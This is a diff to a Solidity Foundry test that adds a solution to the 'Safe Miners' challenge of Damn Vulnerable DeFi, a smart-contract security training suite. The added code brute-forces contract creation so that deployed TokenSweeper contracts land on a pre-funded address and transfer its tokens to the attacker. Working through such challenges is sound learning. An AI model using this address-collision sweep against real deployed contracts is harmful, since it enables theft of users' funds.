@@ -5,6 +5,8 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
 
 contract SafeMiners is Test {
     uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
@@ -41,6 +43,10 @@ contract SafeMiners is Test {
         /**
          * EXPLOIT START *
          */
+        for (uint256 nonce = 0; nonce < 1000; nonce++) {
+            vm.prank(attacker);
+            new BrutalSafeMiners(attacker, dvt, 1000);
+        }
 
         /**
          * EXPLOIT END *
@@ -56,5 +62,22 @@ contract SafeMiners is Test {
         // The attacker took all tokens available in the deposit address
         assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
         assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
+    }
+}
+
+contract BrutalSafeMiners {
+    constructor(address attacker, IERC20 token, uint256 nonces) {
+        for (uint256 i = 0; i < nonces; i++) {
+            new TokenSweeper(attacker, token);
+        }
+    }
+}
+
+contract TokenSweeper {
+    constructor(address attacker, IERC20 token) {
+        uint256 balance = token.balanceOf(address(this));
+        if (balance > 0) {
+            token.transfer(attacker, balance);
+        }
     }
 }
